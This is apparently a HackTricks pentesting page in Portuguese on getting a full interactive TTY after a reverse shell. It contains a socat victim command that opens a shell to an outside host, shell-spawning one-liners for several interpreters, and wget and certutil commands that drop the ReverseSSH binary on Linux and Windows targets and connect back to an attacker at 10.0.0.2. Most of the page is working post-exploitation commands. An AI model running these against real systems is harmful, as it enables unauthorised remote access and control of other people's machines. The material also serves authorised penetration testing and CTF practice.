# TTYs completos

{{#include ../../banners/hacktricks-training.md}}

## TTY completo

Observe que o shell definido na variável `SHELL` **deve estar listado em** _**/etc/shells**_ ou `The value for the SHELL variable was not found in the /etc/shells file This incident has been reported`. Além disso, observe que os próximos snippets funcionam apenas no bash. Se você estiver em um zsh, mude para bash antes de obter o shell executando `bash`.

#### Python
```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'

(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
> [!TIP]
> Você pode obter o **número** de **linhas** e **colunas** executando **`stty -a`**

#### script
```bash
script /dev/null -qc /bin/bash #/dev/null is to not store anything
(inside the nc session) CTRL+Z;stty raw -echo; fg; ls; export SHELL=/bin/bash; export TERM=screen; stty rows 38 columns 116; reset;
```
#### socat
```bash
#Listener:
socat file:`tty`,raw,echo=0 tcp-listen:4444

#Victim:
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
```
### **Spawn shells**

- `python -c 'import pty; pty.spawn("/bin/sh")'`
- `echo os.system('/bin/bash')`
- `/bin/sh -i`
- `script -qc /bin/bash /dev/null`
- `perl -e 'exec "/bin/sh";'`
- perl: `exec "/bin/sh";`
- ruby: `exec "/bin/sh"`
- lua: `os.execute('/bin/sh')`
- IRB: `exec "/bin/sh"`
- vi: `:!bash`
- vi: `:set shell=/bin/bash:shell`
- nmap: `!sh`

## ReverseSSH

Uma forma conveniente de obter **acesso shell interativo**, além de **transferencias de arquivos** e **port forwarding**, e colocar o servidor ssh compilado estaticamente [ReverseSSH](https://github.com/Fahrj/reverse-ssh) no alvo.<sup>[[1]](#references)</sup>

Abaixo esta um exemplo para `x86` com binarios compactados com upx. Para outros binarios, consulte a [pagina de releases](https://github.com/Fahrj/reverse-ssh/releases/latest/).

1. Prepare localmente para capturar a solicitacao de port forwarding do ssh:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -v -l -p 4444
```
- (2a) Alvo Linux:
```bash
# Drop it via your preferred way, e.g.
wget -q https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86 -O /dev/shm/reverse-ssh && chmod +x /dev/shm/reverse-ssh

/dev/shm/reverse-ssh -p 4444 kali@10.0.0.2
```
- (2b) alvo Windows 10 (para versões anteriores, consulte o [project readme](https://github.com/Fahrj/reverse-ssh#features)):
```bash
# Drop it via your preferred way, e.g.
certutil.exe -f -urlcache https://github.com/Fahrj/reverse-ssh/releases/latest/download/upx_reverse-sshx86.exe reverse-ssh.exe

reverse-ssh.exe -p 4444 kali@10.0.0.2
```
- Se a solicitação de port forwarding do ReverseSSH foi bem-sucedida, agora você deverá conseguir fazer login usando a senha padrão `letmeinbrudipls` no contexto do usuário que está executando o `reverse-ssh(.exe)`:
```bash
# Interactive shell access
ssh -p 8888 127.0.0.1

# Bidirectional file transfer
sftp -P 8888 127.0.0.1
```
## Penelope

[Penelope](https://github.com/brightio/penelope) atualiza automaticamente reverse shells Linux para TTY, gerencia o tamanho do terminal, registra tudo e muito mais. Também oferece suporte a readline para shells Windows.<sup>[[2]](#references)</sup>

![penelope](https://github.com/user-attachments/assets/27ab4b3a-780c-4c07-a855-fd80a194c01e)

## Sem TTY

Se, por algum motivo, você não conseguir obter um full TTY, **ainda poderá interagir com programas** que esperam entrada do usuário. No exemplo a seguir, a senha é passada para o `sudo` para ler um arquivo:
```bash
expect -c 'spawn sudo -S cat "/root/root.txt";expect "*password*";send "<THE_PASSWORD_OF_THE_USER>";send "\r\n";interact'
```
## Referências

- [1] [ReverseSSH - servidor ssh estaticamente vinculado com funcionalidade de reverse shell para CTFs e similares](https://github.com/Fahrj/reverse-ssh)
- [2] [Penelope - handler de shell que automatiza algumas tarefas para facilitar as coisas](https://github.com/brightio/penelope)

{{#include ../../banners/hacktricks-training.md}}
